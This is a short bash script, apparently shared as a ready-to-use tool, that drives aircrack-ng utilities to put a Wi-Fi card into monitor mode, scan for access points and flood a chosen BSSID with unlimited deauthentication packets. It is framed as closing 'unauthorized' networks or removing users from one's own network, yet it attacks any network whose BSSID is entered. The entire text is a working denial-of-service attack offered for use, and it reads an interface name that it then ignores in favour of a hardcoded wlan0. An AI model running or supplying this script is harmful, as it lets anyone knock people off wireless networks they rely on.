
#Linux program for closing an Unauthorized wifi network. Or even kick a user from your own personal network.

clear 

iwconfig

read interface

airmon-ng start wlan0

airmon-ng check kill

airodump-ng wlan0mon

echo "BSSID"

read BSSID

echo  "CHANNEL"

read CHANNEL

airodump-ng --bssid $BSSID -c $CHANNEL wlan0mon

aireplay-ng -0 0 -a $BSSID wlan0mon

airmon-ng stop wlan0mon

service network-manager restart

# Thank You 

